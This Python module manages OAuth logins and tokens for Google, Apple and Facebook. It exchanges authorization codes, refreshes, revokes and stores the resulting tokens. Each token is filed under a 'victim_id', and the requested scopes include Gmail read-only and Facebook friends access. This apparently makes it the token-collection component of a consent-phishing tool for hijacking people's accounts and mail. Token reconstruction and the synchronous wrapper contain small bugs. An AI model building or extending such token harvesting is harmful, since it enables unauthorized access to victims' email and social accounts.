"""
OAuth Manager
Multi-provider OAuth coordination and token management
"""

import os
import json
import secrets
import time
from datetime import datetime, timezone, timedelta
from typing import Optional, Dict, Any, List, Tuple
import logging
import asyncio
from enum import Enum

from services.google_oauth import GoogleOAuthService
from services.apple_oauth import AppleOAuthService
from services.facebook_oauth import FacebookOAuthService
from security.encryption_manager import get_advanced_encryption_manager

logger = logging.getLogger(__name__)

class OAuthProvider(Enum):
    """OAuth provider enumeration"""
    GOOGLE = "google"
    APPLE = "apple"
    FACEBOOK = "facebook"

class OAuthTokenStatus(Enum):
    """OAuth token status enumeration"""
    ACTIVE = "active"
    EXPIRED = "expired"
    REVOKED = "revoked"
    REFRESHING = "refreshing"

class OAuthTokenInfo:
    """OAuth token information container"""
    
    def __init__(self, provider: OAuthProvider, token_data: Dict[str, Any], 
                 user_info: Dict[str, Any], victim_id: str = None):
        self.provider = provider
        self.token_data = token_data
        self.user_info = user_info
        self.victim_id = victim_id
        self.token_id = secrets.token_hex(16)
        self.created_at = datetime.now(timezone.utc)
        self.last_used = None
        self.access_count = 0
        self.status = OAuthTokenStatus.ACTIVE
        
        # Extract token information
        self.access_token = self._extract_access_token()
        self.refresh_token = self._extract_refresh_token()
        self.expires_at = self._extract_expires_at()
    
    def _extract_access_token(self) -> Optional[str]:
        """Extract access token from token data"""
        if self.provider == OAuthProvider.GOOGLE:
            return self.token_data.get("access_token")
        elif self.provider == OAuthProvider.APPLE:
            return self.token_data.get("id_token")
        elif self.provider == OAuthProvider.FACEBOOK:
            return self.token_data.get("access_token")
        return None
    
    def _extract_refresh_token(self) -> Optional[str]:
        """Extract refresh token from token data"""
        if self.provider == OAuthProvider.GOOGLE:
            return self.token_data.get("refresh_token")
        elif self.provider == OAuthProvider.APPLE:
            return self.token_data.get("refresh_token")
        elif self.provider == OAuthProvider.FACEBOOK:
            return None  # Facebook doesn't provide refresh tokens
        return None
    
    def _extract_expires_at(self) -> Optional[datetime]:
        """Extract expiration time from token data"""
        if self.provider == OAuthProvider.GOOGLE:
            expires_in = self.token_data.get("expires_in")
            if expires_in:
                return datetime.now(timezone.utc) + timedelta(seconds=expires_in)
        elif self.provider == OAuthProvider.APPLE:
            # Apple tokens are typically valid for 1 hour
            return datetime.now(timezone.utc) + timedelta(hours=1)
        elif self.provider == OAuthProvider.FACEBOOK:
            expires_in = self.token_data.get("expires_in")
            if expires_in:
                return datetime.now(timezone.utc) + timedelta(seconds=expires_in)
        return None
    
    def is_expired(self) -> bool:
        """Check if token is expired"""
        if not self.expires_at:
            return False
        return datetime.now(timezone.utc) > self.expires_at
    
    def mark_used(self):
        """Mark token as used"""
        self.last_used = datetime.now(timezone.utc)
        self.access_count += 1
    
    def to_dict(self) -> Dict[str, Any]:
        """Convert to dictionary"""
        return {
            "token_id": self.token_id,
            "provider": self.provider.value,
            "access_token": self.access_token,
            "refresh_token": self.refresh_token,
            "expires_at": self.expires_at.isoformat() if self.expires_at else None,
            "user_info": self.user_info,
            "victim_id": self.victim_id,
            "created_at": self.created_at.isoformat(),
            "last_used": self.last_used.isoformat() if self.last_used else None,
            "access_count": self.access_count,
            "status": self.status.value,
            "is_expired": self.is_expired()
        }

class OAuthManager:
    """Multi-provider OAuth management system"""
    
    def __init__(self, mongodb_connection=None, redis_client=None):
        self.mongodb = mongodb_connection
        self.redis = redis_client
        
        # Initialize OAuth services
        self.google_service = GoogleOAuthService()
        self.apple_service = AppleOAuthService()
        self.facebook_service = FacebookOAuthService()
        
        # Initialize encryption manager (with fallback)
        try:
            self.encryption_manager = get_advanced_encryption_manager()
        except ValueError:
            logger.warning("Advanced encryption manager not available, using basic encryption")
            self.encryption_manager = None
        
        # Token storage
        self.active_tokens: Dict[str, OAuthTokenInfo] = {}
        
        # Provider configuration
        self.providers = {
            OAuthProvider.GOOGLE: {
                "service": self.google_service,
                "enabled": self.google_service.is_configured(),
                "scopes": ["openid", "email", "profile", "https://www.googleapis.com/auth/gmail.readonly"]
            },
            OAuthProvider.APPLE: {
                "service": self.apple_service,
                "enabled": self.apple_service.is_configured(),
                "scopes": ["name", "email"]
            },
            OAuthProvider.FACEBOOK: {
                "service": self.facebook_service,
                "enabled": self.facebook_service.is_configured(),
                "scopes": ["email", "public_profile", "user_friends"]
            }
        }
        
        logger.info("OAuth Manager initialized")
    
    def get_available_providers(self) -> List[Dict[str, Any]]:
        """Get list of available OAuth providers"""
        available_providers = []
        
        for provider, config in self.providers.items():
            available_providers.append({
                "name": provider.value,
                "display_name": provider.value.title(),
                "enabled": config["enabled"],
                "scopes": config["scopes"],
                "authorize_url": f"/api/oauth/{provider.value}/authorize"
            })
        
        return available_providers
    
    def get_authorization_url(self, provider: OAuthProvider, state: str = None, 
                           redirect_uri: str = None) -> str:
        """
        Get authorization URL for provider
        
        Args:
            provider: OAuth provider
            state: State parameter for CSRF protection
            redirect_uri: Custom redirect URI
            
        Returns:
            Authorization URL
        """
        try:
            if provider not in self.providers:
                raise ValueError(f"Unsupported OAuth provider: {provider}")
            
            config = self.providers[provider]
            if not config["enabled"]:
                raise ValueError(f"OAuth provider {provider.value} is not configured")
            
            service = config["service"]
            
            # Generate state if not provided
            if not state:
                state = secrets.token_urlsafe(32)
            
            # Get authorization URL from service
            if provider == OAuthProvider.GOOGLE:
                return service.get_authorization_url(state, redirect_uri)
            elif provider == OAuthProvider.APPLE:
                return service.get_authorization_url(state, redirect_uri)
            elif provider == OAuthProvider.FACEBOOK:
                return service.get_authorization_url(state, redirect_uri)
            
        except Exception as e:
            logger.error(f"Error getting authorization URL for {provider.value}: {e}")
            raise
    
    async def exchange_code_for_tokens(self, provider: OAuthProvider, code: str, 
                                     redirect_uri: str = None) -> Optional[OAuthTokenInfo]:
        """
        Exchange authorization code for tokens
        
        Args:
            provider: OAuth provider
            code: Authorization code
            redirect_uri: Redirect URI used in authorization
            
        Returns:
            OAuth token info or None if failed
        """
        try:
            if provider not in self.providers:
                raise ValueError(f"Unsupported OAuth provider: {provider}")
            
            config = self.providers[provider]
            if not config["enabled"]:
                raise ValueError(f"OAuth provider {provider.value} is not configured")
            
            service = config["service"]
            
            # Exchange code for tokens
            if provider == OAuthProvider.GOOGLE:
                token_data = await service.exchange_code_for_tokens(code, redirect_uri)
                if not token_data:
                    return None
                
                # Get user profile
                user_profile = await service.get_user_profile(token_data["access_token"])
                if not user_profile:
                    return None
                
            elif provider == OAuthProvider.APPLE:
                token_data = await service.exchange_code_for_tokens(code, redirect_uri)
                if not token_data:
                    return None
                
                # Apple returns user info in token data
                user_profile = token_data.get("user_info", {})
                
            elif provider == OAuthProvider.FACEBOOK:
                token_data = await service.exchange_code_for_tokens(code, redirect_uri)
                if not token_data:
                    return None
                
                # Get user profile
                user_profile = await service.get_user_profile(token_data["access_token"])
                if not user_profile:
                    return None
            
            # Create token info
            token_info = OAuthTokenInfo(provider, token_data, user_profile)
            
            # Store token securely
            await self._store_token(token_info)
            
            logger.info(f"OAuth token exchange successful for {provider.value}: {user_profile.get('email')}")
            return token_info
            
        except Exception as e:
            logger.error(f"Error exchanging code for tokens for {provider.value}: {e}")
            return None
    
    async def refresh_token(self, token_id: str) -> Optional[OAuthTokenInfo]:
        """
        Refresh OAuth token
        
        Args:
            token_id: Token ID to refresh
            
        Returns:
            Refreshed token info or None if failed
        """
        try:
            # Get token info
            token_info = await self._get_token(token_id)
            if not token_info:
                logger.error(f"Token not found: {token_id}")
                return None
            
            if token_info.status != OAuthTokenStatus.ACTIVE:
                logger.error(f"Token is not active: {token_id}")
                return None
            
            if not token_info.refresh_token:
                logger.error(f"No refresh token available: {token_id}")
                return None
            
            provider = token_info.provider
            service = self.providers[provider]["service"]
            
            # Refresh token
            if provider == OAuthProvider.GOOGLE:
                new_token_data = await service.refresh_token(token_info.refresh_token)
            elif provider == OAuthProvider.APPLE:
                new_token_data = await service.refresh_token(token_info.refresh_token)
            elif provider == OAuthProvider.FACEBOOK:
                new_token_data = await service.refresh_token(token_info.access_token)
            else:
                logger.error(f"Unsupported provider for refresh: {provider}")
                return None
            
            if not new_token_data:
                logger.error(f"Token refresh failed: {token_id}")
                return None
            
            # Update token info
            token_info.token_data = new_token_data
            token_info.access_token = token_info._extract_access_token()
            token_info.refresh_token = token_info._extract_refresh_token()
            token_info.expires_at = token_info._extract_expires_at()
            token_info.status = OAuthTokenStatus.ACTIVE
            
            # Store updated token
            await self._store_token(token_info)
            
            logger.info(f"Token refreshed successfully: {token_id}")
            return token_info
            
        except Exception as e:
            logger.error(f"Error refreshing token {token_id}: {e}")
            return None
    
    async def revoke_token(self, token_id: str) -> bool:
        """
        Revoke OAuth token
        
        Args:
            token_id: Token ID to revoke
            
        Returns:
            True if successful, False otherwise
        """
        try:
            # Get token info
            token_info = await self._get_token(token_id)
            if not token_info:
                logger.error(f"Token not found: {token_id}")
                return False
            
            provider = token_info.provider
            service = self.providers[provider]["service"]
            
            # Revoke token with provider
            if provider == OAuthProvider.GOOGLE:
                success = await service.revoke_token(token_info.access_token)
            elif provider == OAuthProvider.APPLE:
                success = await service.revoke_token(token_info.access_token)
            elif provider == OAuthProvider.FACEBOOK:
                success = await service.revoke_token(token_info.access_token)
            else:
                logger.error(f"Unsupported provider for revocation: {provider}")
                return False
            
            if success:
                # Mark token as revoked
                token_info.status = OAuthTokenStatus.REVOKED
                await self._store_token(token_info)
                
                logger.info(f"Token revoked successfully: {token_id}")
                return True
            else:
                logger.error(f"Token revocation failed: {token_id}")
                return False
            
        except Exception as e:
            logger.error(f"Error revoking token {token_id}: {e}")
            return False
    
    async def validate_token(self, token_id: str) -> bool:
        """
        Validate OAuth token
        
        Args:
            token_id: Token ID to validate
            
        Returns:
            True if valid, False otherwise
        """
        try:
            # Get token info
            token_info = await self._get_token(token_id)
            if not token_info:
                return False
            
            if token_info.status != OAuthTokenStatus.ACTIVE:
                return False
            
            if token_info.is_expired():
                # Try to refresh if possible
                if token_info.refresh_token:
                    refreshed = await self.refresh_token(token_id)
                    return refreshed is not None
                else:
                    token_info.status = OAuthTokenStatus.EXPIRED
                    await self._store_token(token_info)
                    return False
            
            provider = token_info.provider
            service = self.providers[provider]["service"]
            
            # Validate with provider
            if provider == OAuthProvider.GOOGLE:
                return await service.validate_token(token_info.access_token)
            elif provider == OAuthProvider.APPLE:
                return service.validate_token(token_info.access_token)
            elif provider == OAuthProvider.FACEBOOK:
                return service.validate_token(token_info.access_token)
            
            return False
            
        except Exception as e:
            logger.error(f"Error validating token {token_id}: {e}")
            return False
    
    async def get_user_profile(self, token_id: str) -> Optional[Dict[str, Any]]:
        """
        Get user profile using token
        
        Args:
            token_id: Token ID
            
        Returns:
            User profile or None
        """
        try:
            # Get token info
            token_info = await self._get_token(token_id)
            if not token_info:
                return None
            
            # Mark token as used
            token_info.mark_used()
            await self._store_token(token_info)
            
            return token_info.user_info
            
        except Exception as e:
            logger.error(f"Error getting user profile for token {token_id}: {e}")
            return None
    
    async def _store_token(self, token_info: OAuthTokenInfo):
        """Store OAuth token securely"""
        try:
            # Store in memory
            self.active_tokens[token_info.token_id] = token_info
            
            # Store encrypted in secure storage
            encrypted_data = {
                "token_data": token_info.token_data,
                "user_info": token_info.user_info,
                "victim_id": token_info.victim_id,
                "created_at": token_info.created_at.isoformat(),
                "last_used": token_info.last_used.isoformat() if token_info.last_used else None,
                "access_count": token_info.access_count,
                "status": token_info.status.value
            }
            
            # Use secure token storage (if available)
            if self.encryption_manager:
                success = self.encryption_manager.store_oauth_token(
                    token_info.token_id,
                    encrypted_data,
                    token_info.victim_id,
                    3600  # 1 hour expiry
                )
            else:
                logger.warning(f"Encryption manager not available, token {token_info.token_id} stored in memory only")
                success = True
            
            if not success:
                logger.error(f"Failed to store token securely: {token_info.token_id}")
            
        except Exception as e:
            logger.error(f"Error storing token: {e}")
    
    async def _get_token(self, token_id: str) -> Optional[OAuthTokenInfo]:
        """Get OAuth token"""
        try:
            # Try memory first
            if token_id in self.active_tokens:
                return self.active_tokens[token_id]
            
            # Try secure storage (if available)
            if self.encryption_manager:
                encrypted_data = self.encryption_manager.retrieve_oauth_token(token_id)
                if not encrypted_data:
                    return None
            else:
                # No encryption manager, token not available
                return None
            
            # Reconstruct token info
            provider_name = encrypted_data.get("provider", "google")
            provider = OAuthProvider(provider_name)
            
            token_info = OAuthTokenInfo(
                provider,
                encrypted_data["token_data"],
                encrypted_data["user_info"],
                encrypted_data.get("victim_id")
            )
            
            token_info.token_id = token_id
            token_info.created_at = datetime.fromisoformat(encrypted_data["created_at"])
            token_info.last_used = datetime.fromisoformat(encrypted_data["last_used"]) if encrypted_data.get("last_used") else None
            token_info.access_count = encrypted_data.get("access_count", 0)
            token_info.status = OAuthTokenStatus(encrypted_data.get("status", "active"))
            
            # Store in memory
            self.active_tokens[token_id] = token_info
            
            return token_info
            
        except Exception as e:
            logger.error(f"Error getting token {token_id}: {e}")
            return None
    
    async def cleanup_expired_tokens(self) -> int:
        """Clean up expired tokens"""
        try:
            count = 0
            current_time = datetime.now(timezone.utc)
            
            for token_id, token_info in list(self.active_tokens.items()):
                if token_info.is_expired() and token_info.status == OAuthTokenStatus.ACTIVE:
                    token_info.status = OAuthTokenStatus.EXPIRED
                    await self._store_token(token_info)
                    count += 1
            
            logger.info(f"Cleaned up {count} expired tokens")
            return count
            
        except Exception as e:
            logger.error(f"Error cleaning up expired tokens: {e}")
            return 0
    
    def get_manager_stats(self) -> Dict[str, Any]:
        """Get OAuth manager statistics"""
        try:
            stats = {
                "active_tokens_count": len(self.active_tokens),
                "providers": {},
                "timestamp": datetime.now(timezone.utc).isoformat()
            }
            
            # Provider stats
            for provider, config in self.providers.items():
                stats["providers"][provider.value] = {
                    "enabled": config["enabled"],
                    "scopes": config["scopes"]
                }
            
            return stats
            
        except Exception as e:
            logger.error(f"Error getting manager stats: {e}")
            return {"error": str(e)}

# Global OAuth manager instance
oauth_manager = None

def initialize_oauth_manager(mongodb_connection=None, redis_client=None) -> OAuthManager:
    """Initialize global OAuth manager"""
    global oauth_manager
    oauth_manager = OAuthManager(mongodb_connection, redis_client)
    return oauth_manager

def get_oauth_manager() -> OAuthManager:
    """Get global OAuth manager"""
    if oauth_manager is None:
        raise ValueError("OAuth manager not initialized")
    return oauth_manager

# Convenience functions
def get_available_oauth_providers() -> List[Dict[str, Any]]:
    """Get available OAuth providers (global convenience function)"""
    return get_oauth_manager().get_available_providers()

def get_oauth_authorization_url(provider: str, state: str = None, redirect_uri: str = None) -> str:
    """Get OAuth authorization URL (global convenience function)"""
    return get_oauth_manager().get_authorization_url(OAuthProvider(provider), state, redirect_uri)

def exchange_oauth_code_for_tokens(provider: str, code: str, redirect_uri: str = None) -> Optional[OAuthTokenInfo]:
    """Exchange OAuth code for tokens (global convenience function)"""
    return get_oauth_manager().exchange_code_for_tokens(OAuthProvider(provider), code, redirect_uri)
